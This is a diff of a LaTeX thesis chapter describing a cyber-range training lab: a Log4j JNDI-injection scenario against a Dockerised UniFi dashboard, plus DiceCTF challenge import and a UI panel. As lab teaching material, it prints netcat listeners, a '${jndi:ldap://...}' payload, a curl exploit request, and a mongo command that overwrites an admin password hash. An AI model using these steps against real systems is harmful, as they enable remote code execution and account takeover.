+    \item Insert in the certificates folder the PEM format SSL certificate with the full certificate chain. under the name of \texttt{fullchain.pem}.
 \end{enumerate}
 
 The private key file belonging to UniFi's dashboard domain was obtained in the final command form Listing \ref{lst:cmd_commands_unifi_ca}. The full chain file is simply a concatenation of the public-key certificates of the CA and the \texttt{example-domain.ui.com} domain. 
 
-Furthermore, entry point scripts were changed to always reload SSL certificates inside the Docker container. This was not the default behavior, as the Docker image was previously configured to issue a file with the hashes of the files in the certificates folder and check for their existence.
+Furthermore, Docker entry point scripts were changed to always reload SSL certificates inside UniFi's Docker container. This was not the default behavior, as the Docker image was previously configured to issue a file with the hashes of the certificates and check for their existence. In such case, SSL certificates were not reloaded.
 
 % Entrypoint Script
 
-After the creation of the above-mentioned SSL certificates, the newly created root CA's public-key certificate is needed in the attacker machine so it can be considered trustworthy. This way, when the trainee visits the UniFi dashboard, the website appears as a legitimate HTTPS connection. This setup is presented in Listing  achieved with the following entry point script:
+After the creation of the above-mentioned SSL certificates, the newly created root CA's public-key certificate is needed in the attacker machine so it can be considered trustworthy. This way, when the trainee visits the UniFi dashboard, the website appears with a legitimate HTTPS connection. This setup is presented in Listing \ref{lst:log4j_entrypoint_script} achieved with the following entry point script:
 
 \begin{lstlisting}[language=bash,caption=Entrypoint Bash Script.,numbers=none,label={lst:log4j_entrypoint_script}]
 #!/bin/bash
@@ -580,7 +508,7 @@ update-ca-certificates
 cat policies.json > /usr/lib/firefox-esr/distribution/policies.json
 \end{lstlisting}
 
-Every template file is within the scenario's \texttt{setup} folder. Firstly, we run a \textit{python} script that will be promptly explained. Then, we copy the root CA's public-key certificate into a special \texttt{ca-certificates} folder and run the \texttt{update-ca-certificates} command, which turns our newly placed root CA certificate into system-wide trusted. So, every digital certificate signed by this new root CA will be deemed safe. After this, we need the Firefox browser to consider this CA safe. So we copied the \texttt{policies.json} file into a special folder.
+Every template file is within the scenario's setup folder. Firstly, we run a \textit{Python} script that will be promptly explained. Then, we copy the root CA's public-key certificate into a special \texttt{ca-certificates} folder and run the \texttt{update-ca-certificates} command, which turns our newly placed root CA certificate into system-wide trusted. So, every digital certificate signed by this new root CA will be deemed safe. After this, we need the Firefox browser to consider this CA safe. So we copied the \texttt{policies.json} file into a special folder.
 
 \begin{lstlisting}[caption=Firefox's Policies File.,numbers=none,label={lst:firefox_json_policies}]
 {
@@ -600,7 +528,7 @@ Listing \ref{lst:firefox_json_policies} presents the policies file, which is rea
 
 % Selenium
 
-After loading the SSL certificates, we obtained the desired effect, an HTTPS connection when loading UniFi's dashboard. Still, there was a slight problem. When hitting the dashboard's web page for the first time, the initial wizard setup was shown. We had to overcome this by creating a Selenium script (\textit{setup.py} shown in Listing \ref{lst:log4j_entrypoint_script}) for this effect using Firefox's \textit{WebDriver} as a way to instruct the behavior of the browser remotely. The tasks performed by Selenium can be summarized in:
+After loading the SSL certificates, we obtained the desired effect, an HTTPS connection when loading UniFi's dashboard. Still, there is a slight problem. When hitting the dashboard's web page for the first time, the initial wizard setup was shown. We had to overcome this by creating a Selenium script (\textit{setup.py} shown in Listing \ref{lst:log4j_entrypoint_script}) for this effect using Firefox's \textit{WebDriver} as a way to instruct the behavior of the browser remotely. The tasks performed by Selenium can be summarized in:
 
 \begin{itemize}
     \item Visiting UniFi's web dashboard page.
@@ -614,58 +542,19 @@ The goal of the Log4j exploit on UniFi's software is to obtain a reverse shell, 
 
 Initially, we can dig a little into the reconnaissance process and check which ports are open by default in the victim machine using \texttt{nmap}. We can see port 8443, which is where UniFi's interface is.
 
-\begin{lstlisting}[caption=Nmap output over victim machine.,numbers=none,label={lst:nmap_victim}]
-# nmap -Pn example-domain.ui.com
-Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-29 18:52 UTC
-Nmap scan report for example-domain.ui.com (172.152.0.1)
-Host is up (0.000034s latency).
-rDNS record for 172.152.0.1: edge_router.external_net
-Not shown: 997 closed tcp ports (reset)
-PORT     STATE SERVICE
-53/tcp   open  domain
-443/tcp  open  https
-8443/tcp open  https-alt
-MAC Address: 02:42:AC:98:00:01 (Unknown)
- 
-Nmap done: 1 IP address (1 host up) scanned in 0.32 seconds
-\end{lstlisting}
-
-Then, we access the \texttt{https://example-domain.ui.com:8443} domain and get the following page:
+Then, we access the \texttt{https://example-domain.ui.com:8443} domain and get the login page from Fig. \ref{fig:log4j_unifi_initial_dashboard}.
 
 \begin{figure}[H]
-    \includegraphics[width=15cm]{figures/unifi_initial_dashboard.png}
-    \caption{UniFi's initial dashboard.}
+    \includegraphics[width=9cm]{figures/unifi_initial_dashboard.png}
+    \caption{UniFi's Initial Dashboard.}
     \label{fig:log4j_unifi_initial_dashboard}
 \end{figure}
 
 As mentioned earlier, we need to target a field we know will be logged by Apache Log4j using a malicious JNDI query. In our case, it is the \texttt{remember} field of the POST request.
 
-\begin{lstlisting}[caption=UniFi Dashboard POST Request.,numbers=none,label={lst:unifi_post_request}]
-POST /api/login HTTP/1.1
-Host: example-domain.ui.com:8443
-User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
-Accept: */*
-Accept-Language: en-US,en;q=0.5
-Accept-Encoding: gzip, deflate, br
-Referer: https://example-domain.ui.com:8443/manage/account/login?redirect=%2Fmanage
-Content-Type: application/json; charset=utf-8
-Origin: https://example-domain.ui.com:8443
-Content-Length: 76
-Connection: keep-alive
-Sec-Fetch-Dest: empty
-Sec-Fetch-Mode: cors
-Sec-Fetch-Site: same-origin
- 
-{"username":"myuser","password":"mypassword","remember":false,"strict":true}
-\end{lstlisting}
+Then, we must test if the web application is vulnerable to the Log4j attack. First, we listen for connections on port 9999 using \texttt{netcat} with: \texttt{nc -lnvp 9999}. From the POST request issued when submitting the login form, we only need to change the \texttt{remember} field to \texttt{\$\{jndi:ldap://172.152.0.2:9\\999/whatever\}} and issue the modified POST request. Notice \texttt{172.152.0.2} is the attacker machine's IP address.
 
-Then we must test if the web application is vulnerable to the Log4j attack. First, we listen for connections on port 9999 using \texttt{netcat} with: \texttt{nc -lnvp 9999}. From the example request of Listing \ref{lst:unifi_post_request} we only need to change the \texttt{remember} field to \texttt{\$\{jndi:ldap://172.152.0.2:9\\999/whatever\}} and issue the modified POST request:
-
-\begin{lstlisting}[caption=Issuing Malicious POST Request.,numbers=none,label={lst:unifi_malicious_post_request}]
-curl 'https://example-domain.ui.com:8443/api/login' -X POST -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0' -H 'Accept: */*' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate, br' -H 'Referer: https://example-domain.ui.com:8443/manage/account/login?redirect=%2Fmanage' -H 'Content-Type: application/json; charset=utf-8' -H 'Origin: https://example-domain.ui.com:8443' -H 'Connection: keep-alive' -H 'Sec-Fetch-Dest: empty' -H 'Sec-Fetch-Mode: cors' -H 'Sec-Fetch-Site: same-origin' --data-raw '{"username":"a","password":"a","remember":"${jndi:ldap://172.152.0.2:9999/whatever}","strict":true}'
-\end{lstlisting}
-
-As we get a connection to port 9999 from the vulnerable Log4j container, the web application is indeed vulnerable to the exploit. Notice \texttt{172.152.0.2} is the attacker machine's IP address. The next step is to use the Rogue-JNDI GitHub tool\footnote{\url{https://github.com/veracode-research/rogue-jndi}} to obtain a reverse shell on the target. Essentially, this tool sets up a malicious LDAP and HTTP server for JNDI injection attacks. When the tool first receives a connection from the vulnerable client to connect to the local LDAP server, it responds with a malicious entry containing a payload that will be useful to achieve a Remote Code Execution. The steps to build upon this foundation are to stage an LDAP Referral Server that will redirect the initial client request of the victim to an HTTP server where a secondary payload is hosted that will eventually run code on the target. 
+As we get a connection to port 9999 from the vulnerable Log4j container, the web application is indeed vulnerable to the exploit. The next step is to use the Rogue-JNDI GitHub tool\footnote{\url{https://github.com/veracode-research/rogue-jndi}} to obtain a reverse shell on the target. Essentially, this tool sets up a malicious LDAP and HTTP server for JNDI injection attacks. When the tool first receives a connection from the vulnerable client to connect to the local LDAP server, it responds with a malicious entry containing a payload that will be useful to achieve a Remote Code Execution. The steps to build upon this foundation are to stage an LDAP Referral Server that will redirect the initial client request of the victim to an HTTP server where a secondary payload is hosted that will eventually run code on the target. 
 
 The procedures to set up the exploit include first using \texttt{netcat} to listen for inbound connections on port 4444 with the command \texttt{nc -lnvp 4444} and then following the steps of Listing \ref{lst:unifi_clone_rogue_jndi}:
 
@@ -715,8 +604,6 @@ MongoDB server version: 3.4.4
 \end{lstlisting}
 
 Listing \ref{lst:unifi_mongodb_admin_contents} shows the existence of an administrator user named \textit{test\_user}, its email, and the password hash of the user, which can be seen in the \textit{x\_shadow} field. This is a SHA512 hash due to the \textit{\$6\$} characters at the start. As mentioned, cracking this hash to get the provided password would be possible. However, this could take a long time, so we opted for updating the current administrator's password. We first generate a SHA512 hash of the string ``mypassword'' using the command \texttt{mkpasswd -m sha-512 mypassword}. Lastly, the command on Listing \ref{lst:unifi_mongodb_update_admin_password} updates the administrator account password using the previously generated SHA 512 password and the \texttt{ObjectId} of the currently existing administrator.
-
-\clearpage
 
 \begin{lstlisting}[caption=Update Administrator User Account Password.,numbers=none,label={lst:unifi_mongodb_update_admin_password}]
 mongo --port 27117 ace --eval 'db.admin.update({"_id":ObjectId("64750f87f19ea8014a2ceb6d")},{$set:{"x_shadow":"$6$zsmtIX0rAM.G4P8a$TKt4eg15VC11zpQaCVS6nLHdOYOzlfjO5m3Tvle7rtc1SOvMRYTT0jBBnRc
@@ -1058,12 +945,12 @@ Every imported DiceCTF scenario typically has a YAML file that is core to unders
 With all this information in place, we organized our folder structure for each scenario. Our Python script first pulls the DiceCTF's GitHub repositories and recursively looks for the challenges that use Docker. The ones that do not use it are, therefore, excluded. Other specific checks are also performed in this sense. We also look for challenges that were pinpointed to also be excluded because their Docker setup is incompatible with our framework's setup, simply because they use Docker images that do not support the installation of \textit{python3} and \textit{iproute2} packages. Both these packages are required in our setup.
 Then, the script goes through the challenge mentioned above's YAML file and starts creating the scenario's variables file. As before, each scenario's vulnerable container is exposed via a domain, and the format followed by DiceCTF is \texttt{{CHALLENGE\_NAME}.mc.ax}. In our variable's file, we create the necessary configurations in the DNS server, reverse proxy, and the edge router's port forwarding. As each scenario is attack-oriented, we need to include the attacker machine located in the external network in our setup. This will be the machine in control of the trainee. The following tasks involve setting up the custom scenario's structure, which is very similar for each scenario. The only things that change are the created containers and the domain of the exposed service. If the scenario has two or more containers, the container's name is mapped in DNS, which usually happens in Docker. For instance, if a scenario deploys containers \texttt{app} and \texttt{mongo}, the \texttt{app} container may attempt to access the database using the \texttt{mongo} domain. As such, the \texttt{mongo} string must be mapped to the \texttt{mongo} container's IP address.
 
-The last thing on this topic is a feature called \textit{AdminBot} that some scenarios make available. Essentially, this is another service that exposes both a back-end and a front-end. The attacker can request this back-end service to make an HTTP request to a domain of their choice, which can be the vulnerable server itself, in most scenarios, or a randomly selected domain. Typically, this request incorporates a flag in it, for instance, in the form of a cookie. The \textit{AdminBot} is entirely available for the trainee. It works as an extra that can provide real aid when solving the challenge.
+The last thing on this topic is a feature called \textit{AdminBot} that some scenarios make available. Essentially, this is another service that exposes both a back-end and a front-end. The attacker can request this back-end service to make an HTTP request to a domain of their choice, which can be the vulnerable server itself, in most scenarios, or a randomly selected domain. Typically, this request incorporates a flag in it, for instance, in the form of a cookie. The \textit{AdminBot}, as shown in Fig. \ref{fig:admin_bot}, is entirely available to the trainee. It works as an extra that can provide real aid when solving the challenge.
 
 \begin{figure}[H]
-    \includegraphics[width=12cm]{figures/adminbot.png}
+    \includegraphics[width=8cm]{figures/adminbot.png}
     \caption{\textit{AdminBot} interface.}
-    \label{fig:template_net}
+    \label{fig:admin_bot}
 \end{figure}
 
 \section{Scenario Extensibility} \label{sec:validation_scenario_extensibility}
@@ -1094,7 +981,7 @@ Having these considerations in mind and following the logic of the already prese
 For users that like to handle the scenario launching with the touch of a button, we created a user interface that presents us with a listing of every scenario. Fig. \ref{fig:ui_architecture_diagram} presents us with a basic overview of the UI panel's current stance.
 
 \begin{figure}[H]
-    \includegraphics[width=14cm]{figures/ui_diagram.pdf}
+    \includegraphics[width=10cm]{figures/ui_diagram.pdf}
     \caption{User Interface Panel Architecture Diagram.}
     \label{fig:ui_architecture_diagram}
 \end{figure}
@@ -1104,7 +991,7 @@ Along with this functionality, this script also populates the MongoDB database w
 The way we approached this was to have a \textit{WebSocket} bound to the local machine that would echo the output of the scenario's execution command. So, whenever we connect to this \textit{WebSocket} we receive real-time feedback on the scenario's execution process. The way to achieve this was using a program called \textit{websocketd}\footnote{\url{https://github.com/joewalnes/websocketd}}. Then, we have another named FIFO that also waits for incoming data. To the \textit{cancel\_mypipe} FIFO, we wait for commands that cancel the current scenario execution, essentially killing the current \textit{websocketd} process.
 
 \begin{figure}[H]
-    \includegraphics[width=13cm]{figures/ui_dashboard.png}
+    \includegraphics[width=10cm]{figures/ui_dashboard.png}
     \caption{User Interface Panel.}
     \label{fig:ui_panel}
 \end{figure}
